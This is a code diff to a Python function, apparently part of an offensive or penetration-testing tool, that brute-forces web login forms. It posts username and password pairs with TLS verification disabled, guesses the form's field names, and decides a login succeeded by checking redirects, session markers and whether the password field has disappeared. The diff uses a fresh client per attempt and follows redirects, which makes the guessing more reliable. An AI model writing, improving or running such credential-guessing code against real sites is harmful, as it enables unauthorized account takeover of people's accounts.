@@ -216,32 +216,40 @@ def try_login(login_url: str, users: list[str], passwords: list[str],
         return result
 
     try:
-        with httpx.Client(timeout=10.0, follow_redirects=False, verify=False) as client:
-            base = client.get(login_url)
+        probe = httpx.Client(timeout=10.0, follow_redirects=True, verify=False)
+        try:
+            base = probe.get(login_url)
             u_field, p_field = _guess_fields(base.text)
-            result["field_user"], result["field_pass"] = u_field, p_field
-            baseline_len = len(base.text)
+        finally:
+            probe.close()
+        result["field_user"], result["field_pass"] = u_field, p_field
+        login_marker = login_url.rstrip("/").rsplit("/", 1)[-1].lower()  # p.ej. "login.php"
 
-            for user, pwd in pairs[:max_attempts]:
-                result["attempts"] += 1
-                try:
+        for user, pwd in pairs[:max_attempts]:
+            result["attempts"] += 1
+            # Cliente nuevo por intento: evita arrastrar cookies de sesión de un intento a otro.
+            try:
+                with httpx.Client(timeout=10.0, follow_redirects=True, verify=False) as client:
                     resp = client.post(login_url, data={u_field: user, p_field: pwd})
-                except Exception:
-                    continue
-                body = resp.text.lower()
-                redirected = resp.status_code in (301, 302, 303, 307)
-                loc = resp.headers.get("location", "").lower()
-                looks_fail = any(m in body for m in FAIL_MARKERS)
-                looks_ok = any(m in body for m in SUCCESS_MARKERS)
-                redirect_ok = redirected and "login" not in loc and loc not in ("", "/")
-                big_change = abs(len(resp.text) - baseline_len) > 120 and not looks_fail
-
-                if looks_ok or redirect_ok or (big_change and not looks_fail):
-                    result.update({
-                        "success": True, "user": user, "password": pwd,
-                        "evidence": f"HTTP {resp.status_code}" + (f" → {loc}" if loc else ""),
-                    })
-                    return result
+            except Exception:
+                continue
+            body = resp.text.lower()
+            final_url = str(resp.url).lower()
+            has_pw_field = bool(re.search(r"type=['\"]?password", body))
+            looks_fail = any(m in body for m in FAIL_MARKERS)
+            looks_ok = any(m in body for m in SUCCESS_MARKERS)
+            moved_away = login_marker not in final_url
+            # Éxito si: marcador de sesión; o te saca del login; o 200 sin formulario de
+            # contraseña y sin marcador de fallo (ya no te está pidiendo login).
+            ok = (looks_ok
+                  or (moved_away and not looks_fail)
+                  or (resp.status_code == 200 and not has_pw_field and not looks_fail))
+            if ok:
+                result.update({
+                    "success": True, "user": user, "password": pwd,
+                    "evidence": f"HTTP {resp.status_code} → {final_url}",
+                })
+                return result
     except Exception as exc:
         result["error"] = str(exc)
     return result
